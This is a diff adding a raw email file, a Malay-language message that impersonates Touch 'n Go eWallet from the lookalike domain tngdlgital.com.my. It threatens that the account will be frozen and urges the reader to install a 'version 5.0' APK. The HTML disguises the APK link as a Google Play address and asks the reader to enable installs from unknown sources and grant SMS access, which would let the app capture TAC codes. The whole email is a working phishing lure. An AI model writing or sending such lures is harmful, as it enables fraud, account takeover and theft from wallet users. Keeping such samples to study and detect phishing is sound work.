@@ -1,0 +1,44 @@
+Return-Path: <security@tngdlgital.com.my>
+Received: from mx.unifi-mail.example (mx.unifi-mail.example [10.20.0.5])
+	by inbox.unifi-mail.example with LMTP; Sun, 22 Nov 2026 21:15:44 +0800
+Authentication-Results: mx.unifi-mail.example;
+	spf=pass (domain of security@tngdlgital.com.my designates 192.0.2.140 as permitted sender) smtp.mailfrom=tngdlgital.com.my;
+	dkim=none (message not signed);
+	dmarc=none header.from=tngdlgital.com.my
+Received: from mail.tngdlgital.com.my (mail.tngdlgital.com.my [192.0.2.140])
+	by mx.unifi-mail.example (Postfix) with ESMTPS id 3E4F5A6
+	for <aina.rahman@unifi-mail.example>; Sun, 22 Nov 2026 21:15:40 +0800
+From: "Touch 'n Go eWallet" <security@tngdlgital.com.my>
+To: aina.rahman@unifi-mail.example
+Subject: =?UTF-8?Q?Kemas_kini_wajib:_TNG_eWallet_versi_5.0_=E2=80=93_akaun_akan_dibekukan?=
+Date: Sun, 22 Nov 2026 21:15:30 +0800
+Message-ID: <upd-50-99182@tngdlgital.com.my>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="tng03"
+
+--tng03
+Content-Type: text/plain; charset=utf-8
+
+Pengguna TNG eWallet yang dihargai,
+
+Versi aplikasi anda sudah lama dan tidak lagi selamat. Akaun eWallet anda akan dibekukan pada 25 November 2026 jika anda tidak memasang versi 5.0.
+
+Muat turun versi baharu: https://tngdlgital.com.my/download/TNG_eWallet_v5.0.apk
+
+Selepas memasang, log masuk dan benarkan akses SMS supaya kod TAC boleh disahkan secara automatik.
+
+Touch 'n Go Digital Sdn Bhd
+
+--tng03
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:Arial,sans-serif">
+<p><img src="https://tngdlgital.com.my/assets/tng-logo.png" alt="Touch 'n Go eWallet" width="150"></p>
+<p>Pengguna TNG eWallet yang dihargai,</p>
+<p>Versi aplikasi anda sudah lama dan tidak lagi selamat. Akaun eWallet anda <b>akan dibekukan</b> pada 25 November 2026 jika anda tidak memasang versi 5.0.</p>
+<p><a href="https://tngdlgital.com.my/download/TNG_eWallet_v5.0.apk">play.google.com/store/apps/details?id=my.com.tngdigital.ewallet</a></p>
+<p>Jika pautan Google Play tidak berfungsi, pasang terus: <a href="https://tngdlgital.com.my/download/TNG_eWallet_v5.0.apk">TNG_eWallet_v5.0.apk</a> (benarkan "Pasang dari sumber tidak diketahui").</p>
+<p>Selepas memasang, log masuk dan benarkan akses SMS supaya kod TAC boleh disahkan secara automatik.</p>
+<p>Touch 'n Go Digital Sdn Bhd</p>
+</body></html>
+--tng03--
